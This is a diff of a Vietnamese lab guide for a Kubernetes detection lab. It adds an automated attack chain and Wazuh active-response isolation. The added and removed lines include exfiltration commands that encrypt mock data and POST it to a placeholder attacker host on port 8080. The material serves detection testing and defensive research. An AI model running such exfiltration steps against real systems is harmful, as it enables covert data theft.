@@ -16,8 +16,9 @@ Danh mục scenario và cách map MITRE nằm ở [attack-scenarios.md](attack-s
 |---|---|
 | Rule Falco, rule Wazuh, policy Kyverno | Đã viết. Đã kiểm chứng offline: `scripts/scan.sh detection` pass 26/26 case, `scripts/scan.sh policies` pass 10/10 |
 | Chạy trên EKS thật | Chưa. Cần `make up`, `make deploy` rồi đo trên lab |
-| Bước 4 (exfiltration) | Script `attack/exfil.py` và volume `/data` sẽ có ở Phase 6. Hướng dẫn bên dưới mô tả cách kiểm tra tạm |
-| Chạy tự động cả chuỗi tấn công | Phase 6 |
+| Bước 4 (exfiltration) | Script `attack/exfil.py` (AES-256-GCM + RSA) và volume `/data` đã có. Logic mã hóa và guard đã test offline |
+| Chạy tự động cả chuỗi tấn công | `attack/run-attack.sh` chạy các bước 1–4, D, B, G qua `kubectl exec`, ghi timestamp |
+| Phản hồi tự động | Wazuh Active Response `cipherguard-isolate.sh` cô lập container của pod, chỉ bật ở lượt prevent |
 
 ## 1. Chuẩn bị
 
@@ -28,7 +29,13 @@ make deploy-detect           # lượt detect-only: policy để Audit, egress m
 make deploy                  # lượt prevent: policy để Enforce, network default-deny
 ```
 
-`make deploy*` cài Kyverno, các policy, Falco và demo app. Nó cũng đẩy rule lên Wazuh manager (lệnh này tự chờ nếu Wazuh đang cài dở), rồi chạy smoke test.
+`make deploy*` cài Kyverno, các policy, Falco và demo app. Nó cũng đẩy rule lên Wazuh manager (lệnh này tự chờ nếu Wazuh đang cài dở), rồi chạy smoke test. Ở lượt prevent, `make deploy` còn bật Active Response.
+
+Nếu muốn chạy bước exfiltration với mã hóa thật, chuẩn bị trước thư viện `cryptography` cho pod (image demo đã gỡ pip):
+
+```bash
+attack/vendor-deps.sh         # tải wheel cryptography vào attack/vendor/ (chạy một lần)
+```
 
 Mở dashboard Wazuh:
 
@@ -39,6 +46,19 @@ terraform -chdir=infra/terraform output -raw wazuh_dashboard_tunnel | bash
 ```
 
 Trong dashboard, vào **Threat Hunting → Events** và lọc bằng `rule.groups: cipherguard`. Mỗi bước có group riêng, ví dụ `cipherguard_step1` hay `cipherguard_scenario_d`, nên bạn có thể lọc theo từng bước.
+
+### Chạy nhanh cả chuỗi
+
+Thay vì gõ từng lệnh, bạn có thể chạy toàn bộ chuỗi và để script ghi timestamp từng bước:
+
+```bash
+make attack-detect           # lượt detect-only: kỳ vọng có alert, dữ liệu tới attacker
+make attack                  # lượt prevent: kỳ vọng bị chặn, pod có thể bị cô lập
+```
+
+Phần dưới đây mô tả từng bước thủ công, để bạn hiểu mỗi lệnh map rule nào.
+
+### Làm thủ công
 
 Lấy tên pod và vào shell của nó (đây là bước 1, tức foothold):
 
@@ -217,7 +237,14 @@ Trong pod không có `nmap`. Quét bằng Python sẽ kích hoạt rule **100120
 
 ### Bước 4: Exfiltration (T1005, T1041)
 
-Ở Phase 6, file dữ liệu giả sẽ được mount tại `/data`. Script `attack/exfil.py` sẽ mã hóa nó bằng AES-256-GCM, mã hóa key bằng RSA, rồi POST lên attacker host. Những gì phải xảy ra:
+Dữ liệu giả được mount sẵn tại `/data` (ConfigMap `demo-app-testdata`, bật bằng `testData.enabled`). Script [attack/exfil.py](../attack/exfil.py) đọc `/data`, mã hóa body bằng AES-256-GCM, bọc key AES bằng RSA-OAEP (public key lab trong `attack/keys/`), rồi POST lên attacker host. `run-attack.sh` lo việc thả script và thư viện `cryptography` vào `/tmp` của pod rồi chạy nó. Script có ba guard: cần `CIPHERGUARD_LAB=1`, target phải là IP nội bộ VPC, và chỉ đọc thư mục dữ liệu giả.
+
+Chạy thủ công bên trong pod (sau khi `run-attack.sh` đã thả file):
+
+```sh
+CIPHERGUARD_LAB=1 PYTHONPATH=/tmp/pydeps python /tmp/exfil.py \
+  --host <attacker_ip> --port 8080 --pubkey /tmp/keys/lab_recipient_pub.pem
+```
 
 | Hành vi | Alert |
 |---|---|
@@ -229,14 +256,22 @@ Nội dung đã bị mã hóa nên không thể kiểm tra được. Phát hiệ
 
 | Lượt | Kết quả |
 |---|---|
-| Detect-only | Attacker host nhận được file: xem `/var/lib/receiver/` qua `aws ssm start-session` |
-| Prevent | NetworkPolicy chặn cổng 8080, nhưng alert 100119 và 100120 vẫn xuất hiện |
+| Detect-only | Attacker host nhận được blob mã hóa: xem `/var/lib/receiver/` qua `aws ssm start-session` |
+| Prevent | NetworkPolicy chặn cổng 8080, nhưng alert 100119 và 100120 vẫn xuất hiện. Active Response (rule 100130) cô lập container của pod |
 
-Trước Phase 6, bạn có thể thử phần kết nối bằng lệnh sau (attacker host lấy từ `terraform output attacker_private_ip`):
+### Phản hồi tự động (Active Response)
 
-```sh
-python -c "import urllib.request as u; print(u.urlopen(u.Request('http://<attacker_ip>:8080/', data=b'test'), timeout=3).read())"
+Ở lượt prevent, Wazuh manager chạy [cipherguard-isolate.sh](../detection/wazuh/active-response/cipherguard-isolate.sh) trên node khi một trong các rule 100113, 100114, 100117 hoặc 100130 fire. Script dùng `crictl` để dừng đúng container của pod bị tấn công, không đụng tới node, nên node vẫn kết nối Wazuh.
+
+```bash
+# Sau lượt prevent, container của pod có thể đã bị restart:
+kubectl -n demo get pod "$POD" -o jsonpath='{.status.containerStatuses[0].restartCount}'; echo
+# Log phản hồi trên node:
+aws ssm start-session --target <node-id>
+sudo tail /var/ossec/logs/active-responses.log
 ```
+
+Ở lượt detect-only, Active Response **không** bật, để không cắt ngang việc thu thập alert.
 
 ## 4. Bảng tra rule
 
